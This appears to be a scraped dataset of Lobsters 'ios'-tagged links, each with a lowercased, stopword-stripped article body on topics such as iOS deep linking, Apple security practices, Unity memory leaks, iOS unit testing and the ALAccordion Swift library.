444,Lobsters,ios,Apple iOS,The War for Control of the Mobile Web is About to Heat Up,https://medium.com/@TechnoCharms/the-war-for-control-of-the-mobile-web-is-about-to-heat-up-47b73ee501fe,war control mobile web heat,design matter material design business model differentiation advertising company cost user privacy consumer hardware technology apple literally perfected art form bordering religion product design mission icloudbased apps number keynote open source developer technology distribute promote material design native java mobile apps android web apps epic battle developer loyalty apple continues pour syrup slather butter phonegap famous starter ignite bootstrapjs reactjs design thinking,material design display google map app iosdesign mattersyou may noticed recent trend design mobile web apps certain totally flat design aesthetic interesting new animation effect button ripple subtly textured layer seen sliding top otherwhat seeing whether realize unified expression google design thinking expressed design ethos called material design despite surface esoteric effort term providing plumbing nonproprietary design guideline material design secret mission blow hole apple differentiation give mobile advantage back googlematerial design secret mission blow hole apple differentiation give mobile advantage back googlesince material design google initiative project likely seen least apps unique style especially android device spend much time google web applicationsin fact even io famously referred apple walled garden infiltrated particular coincidence term strategic mindshare would argue material design might important contribution open source advancement industry google made since release androidbusiness model differentiationwe start see type design thinking might impact big picture first need take look business model google apple different beastsdespite broadly associated internet search email software service mass google aptly thought advertising company differentiated use internetcentric platform service primary delivery mechanism driving advantage dominant search video email platform google milked epic cash cow well decade becoming highly profitable technology behemoth breadth reach cash position allowed subsidize free product service advertising reach cost user privacyapple hand straight consumer hardware technology brand looking emphasis apple place hardware hinge excellence design quality vertical integration highly lockeddown proprietary software stack see preference vendor lockin major theme protect allimportant brand user experience premium devicesthe barrier entry competitor apple phenomenally high considering investment ip global brand awareness supply chain alone however barrier hinge upon maintenance unassailable consumer brand desire apple literally perfected art form bordering religion product design missionin technical strategy term web apps searched google increase reach google ad creating new content page link search resultsas io surged popularity mobile begun encroach web usage google struggling avoid locked mobile ad revenue due lack search deep data built io mobile apps battle behemoth matchup see increase webbased internet usage playing google strength web apps service helping retain deep link webbased apps indistinguishable native mobile appsapple blind spot web platform service especially developer google aptly exploiting apple much le dependent upon web service application much interested driving adoption proprietary apps apple much leverage crossplatform technology like java javascript feature open webbased internetindeed apple accommodated web technology absolutely needed promote crossplatform access important application safari webkit component allow web access io well highly polished ok gorgeous icloudbased apps number keynote come really embracing web technology open rest api access developer tool web developer really nothing build uponon hand appengine google apps even android use java app development language google clearly opposite camp driving adoption web technology web app development mean google retains shot web searchable content expanding footprint advertising reach popcorn witness alternate ending google v apple showso see google firing shot apple bow direct assault apple core competency design using strongsuit web open source developer technology distribute promote material design native java mobile apps android web apps reason sit reach popcorn witness alternate ending google v apple show beginning end day famously unsexy google app designsthe epic battle developer loyaltyso unfolding scene see battlefield come focus apple continues pour syrup slather butterwith new proprietary incredibly compelling apis surrounding apple watch expansion home automation health research application content ecosystem itunes burden developer learn complex proprietary apis platform explicitly incompatible platform high price paypartially state affair mobile web seeing renewed interest developer may previously written wellfounded complaint performance real app look feel developer drawn mobile native wrapper like phonegap allow web apps access native apis web technology project like famous allows nativespeed performance web animation ui component crossplatform backend platform like starter ignite make easier create mobile web apps work different devicesand web developer mobile otherwise standing still past year mobile marched forward component library ui toolkits like bootstrapjs reactjs made huge gain creating beautiful dynamic web application standardized usage greatly improved productivity consistency web app landscapeso landscape see google play material design card promoting new standard app look feel platform agnostic look feel fact thrives mixed webmobile webnative mobile hybrid environment google might succeed reclaiming lost ground searchable advertisementfriendly webby promoting current generation developer fed platform fragmentation increased workload faced developing supporting platform native android native io web google exploiting strength web application technology using blunt tool design thinking apple used dominate industry
446,Lobsters,ios,Apple iOS,Apple and IPv6 - Happy Eyeballs,https://www.ietf.org/mail-archive/web/v6ops/current/msg22455.html,apple happy eyeball,apple happy eyeball,apple happy eyeball hi everyone today apple released first public seed io o x el capitan seed third developer seed released yesterday include improved version happy eyeball based testing make happy eyeball implementation go roughly io yosemite io el capitan beta previous implementation four year ago designed select connection lowest latency matter agree internet changed since report indicate biasing towards beneficial customer mainstream instead exception le broken tunnel carriergrade nats increasing number throughput may even better average updated implementation performs following query dns resolver aaaa dns record cache request sent back back wire aaaa first first reply get aaaa send syn immediately first reply get expecting aaaa start timer timer fire send syn get aaaa window move address selection list ip address either dns cache receiving close together perform address selection algorithm sort algorithm us historical rtt data prefer address lower latency leeway historical rtt two compared address within use pick best one list sorted send syn first address start timer based average variance historical tcp rtt roughly speaking start second address around time send syn retransmission first address first address reply synack win race cancel tcp connection attempt behavior prof successful beta period expect traffic apple product future note however describes current beta detail subject change please test mean love see test result receive feedback would like personally thank jason fesler paul saab help investigating issue testing thanks david schinazi coreos networking engineer
447,Lobsters,ios,Apple iOS,First look: iOS 9 public beta,http://arstechnica.com/apple/2015/07/first-look-ios-9-public-beta-is-the-update-the-ipad-deserves/,first look io public beta,table content,apple apple kept beta version major io release locked away behind developer paywall nt need actually developer sign account play software either needed pay violate term use getting someone else set year change apple released public beta io anyone want try string attached preview people want know getting install beta people want know coming without putting workinprogress software phone preview skip many lowerlevel thing normally cover io review including performance battery life general stability amount storage space used well security feature new apis many thing subject change software becomes mature pay thorough attention full review fall table content listing image andrew cunningham
449,Lobsters,ios,Apple iOS,Imagining MessageKit: Apple's path to turning iMessage into a platform,https://medium.com/@mg/there-s-a-chat-for-that-apple-s-biggest-platform-opportunity-yet-19d5b1870857,imagining messagekit apple path turning imessage platform,future text nyc mta bus time end graphical user interface gui wrote article chat lyft sprig opentable messagekit imagining might look,already fair amount written subject future texting messagingasaninterface jonathan libov pretty comprehensive set idea established lightweight texting option could replace many apps deal today post title future text say contrast gui defines rule interaction rule frustratingly change app app textbased conversational interaction liberating familiarity really one way skin cat text type displayed right text someone else typed left input field bottom compose messageapp overload real thing personally apps installed iphone right even massive purge month ago possibly use regular basis example airbnb tripit sprig lyft uber venmo handful many apps need phone use daily basisjust yesterday wwdc keynote apple announced average iphone apps insane consideration app sole way interface service feel unnecessarily heavy handed rich alternative exist libov used example nyc mta bus time service make easy text number get bus time without need dedicated interface spartan though get basic job done however want anything text shit lucktherein lie opportunitythe end graphical user interfacedo really believe gui endallbeall way interface computer new app need learn use sometimes quick intuitive oftentimes learning curve associated ittwo year ago ron kaplan wrote article begged question made suggestion next evolution interaction computer conversational user interface article ahead time seems extremely prescient todaythere chat thatwhat instead installing app might instead allow service chat u via imessage point like contact phone enabling twoway conversation get thing done new conversation give relevant permission contact moment like end app could longer message easy noted say conversation mean texting service eg magic luka etc likewise conversational user interface limited textexample apps chatsin mockup see three different example experience currently apps core handling transaction need whole app ton chrome use service lyftrequest ride confirm driver hop car pay single message streamsprigrequest tonight dish button place order pay via conversationopentable get table two namu gaji tonight boom done much easier jumping hoop navigating app obviously many example service would work beautifully experience apps might otherwise use twice might instead bring conversationadditionally kind experience would make onboarding customer dramatically faster easier conversation would prompt io ask kind information shared including perhaps name photo maybe address payment would done apple pay making ultra fast seamless transactionsmessagekit would similar apple kit would enable developer quickly build experience based guide would include permission stack ability create unique input method way enable discovery user perspective entire thing would optin apps able start messaging without initiatingimagining might look
450,Lobsters,ios,Apple iOS,How we turned JSON into a full programming language,https://medium.com/relevant-stories/rel-chapter-1-907ff616bf80,turned json full programming language,update october relevant sign wirchoreal adolfo relevantai,update october avoid confusion relevant upcoming cardbuilding platform temporarily unlisted stored away articleif wish know cardbuilding tool sign hereyou also tweet wirchoreal email directly adolfo relevantai
451,Lobsters,ios,Apple iOS,Mobile App Design that Scales: Building for Existing and Fututre Devices,http://www.telerik.com/campaigns/mobile-app-design-that-scales,mobile app design scale building existing fututre device,challenge partnership community deliver expected,challenge demand better user experience continues grow time develop high quality modern engaging application continues shrink stop sweating ui focus part application truly make differencepartnership community like developer purpose life make developer superheroes enabling deliver expected faster expected nearly two decade partnering community two million developer help cut development time increase productivity make easy embrace latest technology user experience trendsdeliver expected using modern featurerich professionally designed ui component telerik kendo ui armed everything need deliver outstanding web mobile desktop experience le timewith backing legendary technical support provided directly developer build product confident best partner rely journey
452,Lobsters,ios,Apple iOS,Deep linking & search in iOS 9,https://medium.com/ios-os-x-development/deep-linking-search-in-ios-9-will-change-everything-feab0bb7e189,deep linking search io,deep linking search io change everything deep linking urx button parse deep linking work io search new pagerank google change,deep linking search io change everythingthe holy grail investor discover next google one common pathway deep linking largely io app world incredibly fragmented search apptoapp communication flurry startup trying solve problem urx let application developer search display relevant deep link application also button allows application developer embed deep action third party apps another parse startup powerful platform player game applejust week apple unveiled io slew new feature news multitasking intelligence however one foundational piece functionality somewhat glanced keynote deep linking io apps cohesively linked together via deep link experience feel magicalin io apps cohesively linked together via deep link experience feel magicalhow deep linking work io one friend tweet foursquare link favorite restaurant tapped link twitter io simply launched web view million link even foursquare app installedthis twitter idea link restaurant inside foursquare app great io knew foursquare installed great routed appropriately restaurant inside foursquare app exactly happens io back twitter link tapping foursquare link twitternow tap foursquare link io intelligently route exact place inside foursquare app bypassing safari altogether top throw handy back link go back twitter timeline one tapthe experience exactly would expect two apps work seamlessly together one caveat work foursquare creates url path mapping web native experience specified io developer doc reason foursquare soanother simple example let say espn app reading warrior espn app could place buy button page next warrior home game linked stubhub web link previous world link would kick safari open web view since stubhub would registered link io stubhub app open magically purchase flow inside appin io navigating apps feel extremely fluid app content load quickly back link status bar added help go back previous app first time ever io fluid system place help navigate appsfor first time ever io fluid system place help navigate appsapple call universal deep linking profound impact io ecosystem importantly mobile searchsearchwhile great apps link way used via web link important implication deep linking mobile search moment blue link tap whether google search app io googlecom mostly web content google crawled live age large chunk interesting content also life inside apps completely inaccessible google anyone else matterthis week apple laid set powerful apis intended solve problem first api let application developer tell io content developer specifies content keywords associated content deep link content io index content get ready potential search usersearching maui show deep linked result origin destination prefilled kayak appfor example say searching baklava recipe io search developer yummly already told io incredible recipe baklava user also tapped deep link later yummly link ranked number one baklava tapped take directly baklava recipe inside yummly app addition back link added top left get back search incase want browse search resultssimilarly searching maui kayak offer deep link inside app flight origin city mauia second api allows application developer specify web content io index via apple web crawler apple also index web content search allows io display search content apps user installed tapping link io prompt user download app first sends app web experience via safarifinally third api allows activity type get indexed eg step inside health app apple specifies example health app index section make available user user search step search list item display user current step tapping result automatically open step area health dashboard step marked publicly searchable item user never tracked step health app also receive link step area search step new pagerankpagerank ranking algorithm originally powered google search new world unclear newly indexed content inside apps ranked ie result show first apple develop new pagerank algorithm avoid spam irrelevant result overall user frustration google apple give guideline developer indicates indeed working ranking sure avoid overindexing app content adding unrelated keywords attribute attempt improve ranking result io measure level user engagement search result item user find useful quickly identified eventually stop showing resultsapple develop new pagerank algorithm avoid spam irrelevant result overall user frustration google didgooglewhile little doubt apple slowly surely pushing google default platform one io release time real question becomes apple search experience actually become powerful enough apple pulled trigger apple map way early make mistake againunlike map apple strategy lessen dependency google search seems three pronged building primary search interface using app content using third party data provider yelp using another search engine fallback longtail probably bing strategy take time foundational piece firmly placepublicly available data suggests nontrivial percentage search volume google come iphones ipads large amount transactional search crucial google core business biggest hedge google ever made existence android battle line pretty clearly drawn android google search v io apple search siri changethe mobile era already caused sea change another major shift coming io search
454,Lobsters,ios,Apple iOS,Apple is having its Microsoft moment,http://money.cnn.com/2015/06/05/technology/apple-bugs/index.html?iid=SF_LN,apple microsoft moment,much argument apple computer safer bugfree nasty bug let hacker bury computer virus deep inside mac never find flaw appeared let text message crash iphone problem apple security update irregular infrequent googl found supposed fix weak easily bypassed hacker orcl secrecy offer advice update latest software apple patched serious vulnerability april net market share unwillingness pay potentially disastrous computer bug criminal spy willing pay iphone bug admission guilt hacker broke celebrity icloud account exposed nude photo tim cook said company would beef security measure requiring text message second passcode eventually added crucial feature icloud xeno kovah formal campaign aapl microsoft apple bugreporting system need overhaul msft rapid growth,apple microsoft used device buggy computer researcher want company take security seriously much argument apple computer safer bugfree true accustomed annoying glitch pc past year shown mac ipads iphones far five major flaw affected apple product week encountered nasty bug let hacker bury computer virus deep inside mac never find week earlier flaw appeared let text message crash iphone significant issue neither fixed yet faulty code found every operating system app software program apple outdated strategy fixing remember apple would advertise safer window apple microsoft decade ago problem computer engineer hacker people familiar company practice explained apple five thing wrong approach security apple security update irregular infrequent last year took apple day fix problem folk google googl found apple finally patch hole supposed fix weak easily bypassed hacker oracle orcl quickly moved patch java program susceptible terrible informationstealing malware called flashback apple waited two whole month issue fix even though estimated mac infected nt appear regular patch schedule like microsoft appear patch continuously like google chrome said tod beardsley research manager cybersecurity firm sometimes patch slow arrive sometimes patch difficult develop sure issuing quick fix sometimes backfire sense apple treat bug like product usually little late game plan job right waiting long devastating effect leaving apple customer vulnerable hack theft personal information secrecy apple keep quiet security hole example apple nt admit latest mac bug even real would entice hacker exploit acknowledges text message flaw offer advice fix apple nt explained bug root cause apple work mysterious way reputation tightlipped come confirming existence security issue beardsley said transparency would keep customer alert help large community apple developer suggest fix sense secrecy harmful update latest software still using old version mac operating system apple forsaken example apple patched serious vulnerability april latest version yosemite mean left behind user use operating system maverick mountain lion lion snow leopard according industry figure gathered net market share apple defense customer upgrade latest version free true entirely fair older laptop ca nt handle latest software unwillingness pay apple one major tech company nt reward researcher money finding potentially disastrous computer bug although criminal spy willing pay iphone bug nt made public apple pay nothing zip zilch admission guilt frustrates security folk apple nt tend acknowledge wrong hacker broke celebrity icloud account exposed nude photo last year apple ceo tim cook said company would beef security measure blamed user saying problem really engineering thing security feature would prevented celebrity icloud episode like requiring text message second passcode precisely engineering problem apple credit eventually added crucial feature icloud dealing apple nt easy security researcher xeno kovah said even serious case report critical software flaw carnegie mellon computer emergency readiness team apple still responsive accurate company apple bug fixing problem said bad independent apple developer launched formal campaign wrote letter begging apple improve bugreporting system say little changed apple aapl declined comment story microsoft best apple hacker tell cnnmoney apple bugreporting system need overhaul similar one microsoft went year ago microsoft msft go long painful awakening think back year ago window product used hated notoriously buggy came corporate turnaround microsoft introduced patch tuesday month user would get flood update keep safe microsoft started hosting blue hat invitationonly security conference meet facetoface curious often aggressive researcher apple nt host forum like one microsoft successful strategy improving security bug bounty program implemented microsoft stopped fighting legion hacker turned ragtag army microsoft guardian microsoft worm worm meaningful security change made said katie moussouris microsoft former chief security strategist implemented bug bounty program hopefully apple adapt quickly added pressure apple sudden company victim success moussouris explained apple product popular ever finger keyboard mean code explored inevitably bug found good news apple listening change coming apple aware issue company trying improve communicates researcher according person familiar company plan main challenge dealing rapid growth apple get inundated report possible flaw security team want better job paying closer attention big security issue separating real bug fake one cnnmoney new york first published june pm et
455,Lobsters,ios,Apple iOS,Lessons learned while fixing memory leaks in our first Unity title,http://richg42.blogspot.com/2015/05/lessons-learned-while-fixing-memory.html,lesson learned fixing memory leak first unity title,custom mono dll heap allocation graph gephi dungeon bos low memory warning boehm garbage collector struct v class weak reference www class see daikon forge profiler class http gamesfromwithincomiwantmymemoryapple http c destructor current memory usage unity builtin io memory profiler,several man month tool making instrumenting compiling custom mono dll crawling node heap allocation graph gephi first unity title dungeon bos iosandroid longer leaking significant amount mono heap memory last year uptime io device minute hour easy construct complex system c degenerate continually increasing memory behavior time even though everything else seems fine label system leaking although nt actually leak memory cc sense take single accidental strong reference somewhere mistakenly leak huge amount object time daunting task even original author discover fix large system written garbage collected language nt leak brain dump learned painful process figuring monitor unity app memory usage early possible development mobile device pretty harsh memory restriction see get idea io sure test real device early often prepared serious pain develop test unity editor month end io app receive low memory warning system come memory pressure note io chatty issuing warning helpful log warning game server along amount used client memory help postmortem analysis app randomly dying field unofficial low end io device iphone ipad mini gen device total allocated memory according xcode memory monitor exceeds approx sustained period time eventually ruthlessly terminated kernel ideally nt use device unity mono c heap managed boehm garbage collector basically ccstyle heap garbage collector bolted top allocating memory cheap system version mono unity us pretty dated using microsoft net runtime c development consider horribly spoiled treat c heap like precious resource study cc programmer avoid constantly allocatingfreeing block using custom object pool avoid using heap preferring c struct v class avoid boxing use stringbuilder messing string etc complex system written c careful use weak reference container weak reference extremely useful avoid creating endless chain strong object reference switch several system strong weak reference key place make stable discovering system change tricky determine front exact lifetime object exactly object longer referenced system nt assume garbage collector automagically take care thing boehm collector o memory footprint stabilizes increase time far tell mean careful allocating large temporary buffer object mono heap could unnecessarily bump mono memory footprint decrease amount memory headroom app io basically mono grab o memory greedily hold onto end time memory ca nt used thing texture unity cc heap etc careful using unity www class download large archive bundle class may store downloaded data mono heap actually serious problem u download compressed unity asset bundle user first game session class causing app mono memory footprint increased seriously reduced app memory headroom user first session free play game pretty critical get right boehm collector grows o memory allocation enough internal heap headroom avoid collecting frequently must factor headroom account budgeting c memory ie budget call c memory actual amount memory consumed o level significantly larger approximately experience possible force boehm collector used unity never allocate set amount o memory see calling gcsetmaxheapsize early app initialization note c heap leak app eventually abort heap full may possible call api time carefully bump app mono heap size needed nt tried yet app leak ca nt figure fix leak alternative solution may temporarily acceptable relentlessly free much memory possible optimizing asset switching pvrtc lowering sound music bitrates etc give app memory headroom need run reasonable period time o kill user play level per hour leak per level need find memory somewhere run one hour etc far simpler optimize texture track memory leak large c codebases design code avoid creating ton temporary object trigger frequent collection one menu dialog accidently triggering collection every frame io crushing performance used daikon forge ui library library several serious memory leak try submit fix back author think product le dead email would like fix add debug statistic game along usual fps display make sure stuff work target device current total o memory allocated see io total mono heap used reserved retrieve unity profiler class note class return nondev build total number gc far number frame since last gc average frame second gc infer gc occurs monitoring mono heap used size every update decrease since last update assume gc occured sometime recently developer perspective io memory api tool situation ridiculous mess http gamesfromwithincomiwantmymemoryapple http monitoring app memory consumption io observe make sense statistic xcode memory monitor instrument mach kernel api unity difficult make sense crap end day trusted unity statistic understood exactly statistic computed instrument game key class track live object present system one time display information somewhere easily visible developer running device increment global static counter object constructor decrement c destructor method automatically called object memory actually reclaimed gc io nt shy using pvrtc texture look surprisingly good v format save large amount memory wound using texture except effect ui sprite builtin unity memory profiler work pretty well io usb useful tracking narly c scripting leak invaluable tracking asset problem apps current memory usage io late last week data unity builtin io memory profiler remember leak c code propagate downstream cause apparent leak unity cc heap asset leak helpful mentally model mono heap complex directed graph node individual allocation edge strong reference anything directly indirectly referenced static root either global stack etc wo nt collected large system many leak try waste time fixing reference leaf node graph attack problem high near root possibly hand large amount time pressure get fix right easier fix worst leak term byte leaked per level whatever selectively nulling key reference leafier part graph know nt growing level wrote custom tool help u determine worst offender spend time sorted function allocation occurred fixing leak buy enough time properly fix problem
456,Lobsters,ios,Apple iOS,Unit Testing on iOS: Beyond the Model,http://www.catehuston.com/blog/2015/04/29/unit-testing-on-ios-beyond-the-model/,unit testing io beyond model,show hide workshop example app principle one true way writing software code test better test apps learn background mock ocmock ocmockito uiautomation testing confidence v coverage coverstory frankencover xcover creating seam trouble view controller introducing presenter reactive cocoa mvvm pattern detail testing show hide home screen image editing screen processed image screen github kif end workshop unhedged call option performance workshop like,want introduce app called show hide image processing app ui pretty simple think reasonable example briefly app detects dominant color image creates cool partially colored image based think postcard london black white scene red bus except done algorithmically idea actually artistic talent workshop built around example app talking real one one thing find really useful finding people really might theoretically constraintfree world bend spec match trying demonstrate really admittedly bit unit testing see principle want start thing think true find assumption wildly disagreeable might good sign hate post one true way writing software first one true way writing software really lot well patience argument like better vim emacs higher level think work within constraint make decision make sense u time maybe last developer idiot maybe working different information today different constraint code second code use reason get attached code ok get deleted think also work way write stupid code sometimes mean stupid test better test final thing test better test might contentious code review someone critique test done better way incidentally would require significant refactoring take approach write test even bad test least test improve code mostly avoiding analysis paralysis instead agonizing perfection advocate writing kind test going apps actually writes unit test io apps anyone shipped app without guess kind coverage first io app worked give clue used work google ok red herring zero test coverage shipped without test time junior developer knew wrong asked guy running project tech lead problem unit test said moving fast write test answer compelling really position argue way badly executed project remote office project taken u moved work something else new app test test many talked designing testability dependency injection kind actually write many test fullness time project also taken u moved australia tech lead two engineer clear mandate deadline great noticed often industry learn always teach u much anyway learned bad idea ship app without unit test test target also deadline pretty tight month project finally started believe yes might actually able send app app store another month manager call meeting tell manager happy test coverage mind blown mean worked app without test nobody seemed worry pretty well io app thought test target model code tested add uiautomation test expect background finish story later let start looking better bit background want everyone happy testing concept occur throughout important happy mention library use alternative mock firstly mock mock object create test use simulate behavior real object give set response event record interaction mock nice mock strict mock nice mock guessed nicer strict mock every interaction defined otherwise cause test fail number mocking framework available using ocmock could also look ocmockito worth mentioning use mock use mock verify interaction say event trigger interaction use create state example image app includes option take picture device simulator camera need way create state camera way using mock mock data structure use nsarray instead mock nsarray mock nsarray bad idea mocking state array much harder using real array think inductive proof ever done kind thing math really thing accept true like think test verification program thing accept working data structure test verify interaction tightly coupled inner working code sometimes expect something aware uiautomation testing uiautomation test also known monkey test something go tap button app make thing happen properly black box test know ui inner working code personally use kif wrap apple uiautomation write test objectivec alternative confidence v coverage thing worth mentioning measuring coverage use coverstory option like frankencover xcover code coverage tell u percentage code covered use identify area poor coverage improve coverage mean line executed mean executed properly write one enormous test exercise every line code app might tell much compiles confidence knowing thing work different input covered confidence allows develop test creating seam trouble view controller big reason io testable viewcontroller mix control code view code want write test really want two thing entwined together want seam seam use isolate something test introducing presenter name presenter come mvp model view presenter pattern really matter point split control code viewcontroller leave viewcontroller handling view might split delegate selector put target like button network call interfacing model viewcontroller corresponding presenter memory management presenter need keep weak reference viewcontroller viewcontroller strong reference presenter top level class allows u abstract away code common pairing thing top level class call presenter viewloaded viewcontroller viewdidload viewcontroller pushnavigationcontroller best possible level separation model viewcontroller know presenter myscreenviewcontroller know presenter myscreenpresenter know related myscreenviewcontroller similar reactive cocoa mvvm pattern go full reactive cocoa order make work little enough code happily recreate project time need included detail testing show hide covered concept let look use unit test ui code real app screen highlighted two thing might want test require bit thought home screen let start home screen three button two camera available cut feature set action launching either photo picker provided o viewcontroller containing uiwebview inspiration verifying button click want test right thing happens button clicked three phase testing button io first second expose method called button pressed test third programmatically tap button option testselector add selector xbuttonpressed x button case gallerybuttonpressed gallerybutton expose method header file write test testxbuttonpressed verifies selector seems reasonable right decent coverage two main problem expose method purpose testing worst thing true java visiblefortesting annotation common pattern io get around redeclaring test category like even le verified action actually get added button option sendtouches selector get added presenter presenter viewloaded get called viewcontroller viewdidload mock homeviewcontroller return real uibutton asked button want test call button sendactionsforcontrolevents uicontroleventtouchupinside verify happens button pressed eg imagepicker launched downside little bit complicated upside nothing exposed verifying button tapped right thing happens verifying vc pushed stack thing might want verify another viewcontroller get pushed onto stack viewcontroller accessing navigationcontroller property uiviewcontroller base class viewcontrollers extend consider pushing viewcontrollers view code live viewcontroller might partial mock partial mock allow u mock part object great case like use mock function parent class assume apple tested u isolate code mocking navigation controller let say viewcontroller instance thing testing want make sure navigationcontroller dismissviewcontroller called would look like create mock navigation controller id mocknavigationcontroller ocmstrictclassmock uinavigationcontroller class create partial mock viewcontroller id mockviewcontroller ocmockobject partialmockforobject viewcontroller stub return mocknavigationcontroller mockviewcontroller expect andreturn mocknavigationcontroller navigationcontroller set expectation ocmexpect mocknavigationcontroller dismissviewcontrolleranimated yes completion nil call method trigger viewcontroller dismissviewcontrolleranimated yes withcompletionblock nil verify ocmverifyall mocknavigationcontroller ocmverifyall mockviewcontroller image editing screen next image editing screen see button navigation bar gallery button also camera device camera button notice camera button something use uiautomation simulator camera totally unit test three button bottom apply button little complicated last time get navigation bar button take similar approach navigation bar button regular button couple difference firstly get set viewdidload separate creating presenter top level presenter class property leftnavigationbuttons rightnagivationbuttons top level viewcontroller class viewdidload look follows void viewdidload super viewdidload self navigationitem setleftbarbuttonitems self presenter leftnavigationbuttons animated yes self navigationitem setrightbarbuttonitems self presenter rightnavigationbuttons animated yes self presenter viewloaded create button presenter want target button presenter really matter point isolated want test button tapped want get array returned call performselector extract button uibarbuttonitem button uibarbuttonitem presenter leftnavigationbuttons firstobject perform action button target performselector button action withobject button handling asynchronous code testing challenge screen apply button make app feel faster image get preprocessed apply button enabled preprocessing done challenge arises preprocessing happens background thread ui thread load view switch background thread background thread process image switch back ui thread ui thread enable apply button make thing easier deal handling apply button pressed ready make testing slightly harder xctest mechanism testing asynchronous code called expectation little confusing read essentially create thing expectation include timeout test allow time happen call fulfil expectation thing happened create expectation xctestexpectation expectation self expectationwithdescription desc give wait typically put asserts verify self handler nil run test fail expectation never fulfilled fulfilling easy call expectation fulfill put case want wait apply button enabled fulfill using mock use anddo ocmexpect mockapplybutton setenabled yes anddo nsinvocation invocation expectation fulfill important clear wait go end test fulfilling go somwhere inside test use anddo last thing called end one super fun thing asynchronous testing get test wrong often another test fail make debugging extra exciting processed image screen slideshow requires javascript last screen app carousel two image user swipe swipe gesture actually test write get wrong tried figure programmatically simulate swipe gesture opted test using kif including much think unit test almost everything almost everything everything part ui better covered uiautomation decided one breaking uiimage last example let go even deeper show hide image processing app mean take image stuff part app really wanted able develop test firstly far complicated part really wanted understand going secondly rewrote part app several time could get fast enough test invaluable written test involving image including test image resource probably work fine lot thing wanted image certain property could say like end process give sense part app test approximately line test code plus performance test put separate target get run make test target slow cool programmer right make thing including uiimages break thing including uiimages addition test code test helper function simpler slow draw image context make image one color certain size make image multiple color color image color image harder faster flexible creating context filling array rgba data calling cgbitmapcontextcreateimage make image given width height array uicolors break image list uicolors similar compare two uicolors see r g b value match mean create image certain property matching test want run compare resulting image beyond size remember want confidence coverage two image size break array equal uicolors consider equal create enormous image performance test including code quite long open sourced github kif kif great also kif test see strategy entirely complementary kif test slower run hard test corner case kif test great making sure app accessible throughout sanity check view load testing thing like carousel end interesting testing challenge encountered building show hide aiming test coverage delved workshop day told get test coverage ship discovered little knew testing standard project previously worked good enough general especially compared way write test server side opportunity go start figuring thing covered whilst sometimes requires bit thought done often almost always possible answer junior dev guy said moving fast write unit test today would respond long want move fast yeah usually faster ship today code without test technical debt unhedged call option day soon liable come due testing investment take time develop test though start get back much faster confident shipping build minute rather hour see difference mentioned performance test worth looking order monitor performance app time biggest difference hardest quantify bug found early make production think biggest benefit structure understanding get code default trying unit test everything found interesting covered strategy detail workshop sample app guide take step step adding test like like loading related
457,Lobsters,ios,Apple iOS,iOS security guide (8.3),https://www.apple.com/business/docs/iOS_Security_Guide.pdf,io security guide,,character limit please include personal information comment maximum character limit submit
459,Lobsters,ios,Apple iOS,Fixing UI Elements that Float Away,https://spin.atomicobject.com/2015/05/07/floating-ui-elements/,fixing ui element float away,auto layout constraint floating point error floating point glitching finding fixing bug ieee doubleprecision,testing io app team found puzzling clicking button main dashboard caused whole row button gradually drift even bottom screen always move started moving tended keep sliding direction building ui auto layout constraint would responsive phone different screen size meant lot visibility precise size different part ui calculated specified row span screen bottom element around shrink ensure enough space layout engine handled detail bug appeared testing io io suggested root cause might constraint layout library since positioning started correct gradually drifted wondered floating point error involved floating point error like represented exactly without infinite number many number easy represent decimal approximated binary floating point number rounded number fed back formula rerounded several time drift far enough cause strange bug example saw cad drawing architectural design software glitching floating point error designer setting drawing accidentally imported cad data wrong scale removed continued working without noticing warned ux bug working part layout million kilometer away origin rendered view building inconsistent rounding led cubist take design beyond outer limit accuracy added random turbulence original positioning recovered finding fixing bug mind reviewed layout rule stood look like round number impossible represent exactly floating point becoming something like small amount difference seemed grow like compound interest ui element shifted around fit constraint auto layout bug could work around using number could represented precisely wrote quick python script print close number could used sum difference reciprocal power two ieee floating point number represented binary sign bit exponent fraction sign bit positive exponent offset instead another sign bit bit top fraction represent approximated sign bit negative exponent fraction fraction part lot bit set ultimately round rather going forever decided close enough confirmed drifting stopped appropriate comment explaining chose weird number also noticed number could represented using doubleprecision floating point number use bit instead accuracy singleprecision help apparently io auto layout using singleprecision somewhere
460,Lobsters,ios,Apple iOS,The Similar Phone Finder,http://www.productchart.com/smartphones/similar,similar phone finder,similar phone finder,similar phone finder type name smartphone find alternative similar spec find similar smartphone euclidean distance
462,Lobsters,ios,Apple iOS,ALAccordion - new smart accordion style container view for IOS,https://github.com/Alliants/ALAccordion,alaccordion new smart accordion style container view io,alaccordion overview requirement note screenshots demo installation installation cocoapods note manual installation usage alaccordioncontroller accordion header footer note create section note,alaccordion overview alaccordion accordion style container view io manages set expandablecollapsable content section section open consumes full screen see screenshots section accordion associated custom view controller manages header content view alaccordion relies autolayout provide intrinsic content size header view make super easy custom section header modified animated section alaccordion also allows optional header footer view hidden section opened requirement xcode swift requires io requires autolayout use version swift note alaccordion us arc screenshots demo run example project clone repo run pod install example directory first installation installation cocoapods alaccordion written swift install cocoapods must target io later install cocoapods newer sudo gem install cocoapods add alaccordion podfile note must add useframeworks line use swift cocoapods podfile target target useframeworks pod alaccordion end manual installation add file alaccordionclasses directory project usage show basic usage alaccordion see example project comprehensive example alaccordioncontroller alaccordioncontroller uiviewcontroller subclass container view manages section first create view controller subclass alaccordioncontroller class alhomeviewcontroller alaccordioncontroller override func viewdidload superviewdidload accordion header footer add optional header andor footer accordion setting headerview footerview property note accordion us intrinsic content size header footer view layout ensure setup autolayout constraint correctly override func viewdidload header let header uilabel headertext accordion header selfheaderview header footer let footer uilabel footertext accordion footer selffooterview footer create section create section must pas alaccordion list view controller order displayed view controller instantiated storyboard code note view controller must conform alaccordionsectiondelegate protocol see override func viewdidload let storyboard uistoryboard name main bundle bundlemain let storyboardinstantiateviewcontrollerwithidentifier firstvc let storyboardinstantiateviewcontrollerwithidentifier secondvc let storyboardinstantiateviewcontrollerwithidentifier thirdvc selfsetviewcontrollers section view controller provide alaccordioncontroller new instance uiviewcontroller section accordion section view controller must conform alaccordionsectiondelegate protocol must provide headerview like alaccordioncontroller header footer view headerview must use autolayout provide intrinsic content size changing constraint header view easily change size header eg section opening show detail swift class alfirstsectionviewcontroller uiviewcontroller alaccordionsectiondelegate override func viewdidload superviewdidload mark alaccordioncontrollerdelegate required let headerview uiview let header uilabel headertext section header return header optional func sectionwillopen animated bool optional func sectionwillclose animated bool optional func sectiondidopen optional func sectiondidclose note must manually specify section open example show open section tap gesture headerview swift let headerview uiview let header uilabel headertext section header return header override func viewdidload superviewdidload add gesture recognizer header selfheaderviewaddgesturerecognizer uitapgesturerecognizer target self action selector headertapped func headertapped recognizer uitapgesturerecognizer get section view 